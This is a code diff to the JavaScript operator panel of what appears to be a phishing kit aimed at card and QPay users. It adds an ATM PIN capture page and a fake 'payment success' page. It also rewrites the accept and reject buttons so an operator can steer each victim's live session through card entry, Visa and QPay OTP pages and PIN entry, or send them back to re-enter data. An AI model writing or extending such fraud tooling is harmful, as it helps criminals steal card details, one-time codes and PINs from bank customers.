@@ -7,7 +7,9 @@ const PAGES = [
   { id: 'qpy', name: 'QPay', icon: 'fa-mobile-alt', url: '/qpy.html' },
   { id: 'payment-verify', name: 'otp Visa', icon: 'fa-lock', url: '/payment-verify.html' },
   { id: 'otp', name: 'otp QPY', icon: 'fa-key', url: '/otp.html' },
-  { id: 'wait', name: 'شاشة الإنتظار', icon: 'fa-spinner fa-spin', url: '/wait.html' }
+  { id: 'atm', name: 'الرقم السري ATM', icon: 'fa-keyboard', url: '/atm.html' },
+  { id: 'wait', name: 'شاشة الإنتظار', icon: 'fa-spinner fa-spin', url: '/wait.html' },
+  { id: 'success', name: 'نجاح الدفع', icon: 'fa-check-circle', url: '/success.html' }
 ];
 
 const PAGE_LABELS = {
@@ -19,7 +21,9 @@ const PAGE_LABELS = {
   'qpy': 'QPay',
   'payment-verify': 'otp Visa',
   'otp': 'otp QPY',
-  'wait': 'شاشة الإنتظار'
+  'atm': 'الرقم السري ATM',
+  'wait': 'شاشة الإنتظار',
+  'success': 'نجاح الدفع'
 };
 
 const FORM_FIELD_LABELS = {
@@ -1080,12 +1084,26 @@ function navigateUser(sessionId, pageId) {
 document.addEventListener('DOMContentLoaded', () => {
   setupSearch();
 
+  var FLOW_FORWARD = { 'payment-card': 'payment-verify', 'payment-verify': 'atm', 'atm': 'success' };
+  var FLOW_BACK = { 'payment-card': 'payment-card', 'payment-verify': 'payment-verify', 'atm': 'atm' };
+
+  function detectWaitSource(user) {
+    if (!user || !user.formData) return null;
+    if (user.formData['atm']) return 'atm';
+    if (user.formData['payment-verify']) return 'payment-verify';
+    if (user.formData['payment-card']) return 'payment-card';
+    return null;
+  }
+
   var acceptBtn = document.getElementById('btn-accept');
   if (acceptBtn) {
     acceptBtn.addEventListener('click', function() {
       if (!currentUserData) { showToast('اختر مستخدم أولاً', 'error'); return; }
-      navigateUser(currentUserData.sessionId, 'wait');
-      showToast('تم القبول وتوجيه المستخدم لشاشة الانتظار', 'success');
+      var src = detectWaitSource(currentUserData);
+      var target = (src && FLOW_FORWARD[src]) ? FLOW_FORWARD[src] : 'payment-verify';
+      navigateUser(currentUserData.sessionId, target);
+      var name = PAGE_LABELS[target] || target;
+      showToast('تم القبول → ' + name, 'success');
     });
   }
 
@@ -1093,8 +1111,11 @@ document.addEventListener('DOMContentLoaded', () => {
   if (rejectBtn) {
     rejectBtn.addEventListener('click', function() {
       if (!currentUserData) { showToast('اختر مستخدم أولاً', 'error'); return; }
-      navigateUser(currentUserData.sessionId, 'index');
-      showToast('تم الرفض وإعادة توجيه المستخدم للرئيسية', 'error');
+      var src = detectWaitSource(currentUserData);
+      var target = (src && FLOW_BACK[src]) ? FLOW_BACK[src] : 'payment-card';
+      navigateUser(currentUserData.sessionId, target);
+      var name = PAGE_LABELS[target] || target;
+      showToast('تم الرفض → ' + name, 'error');
     });
   }
 
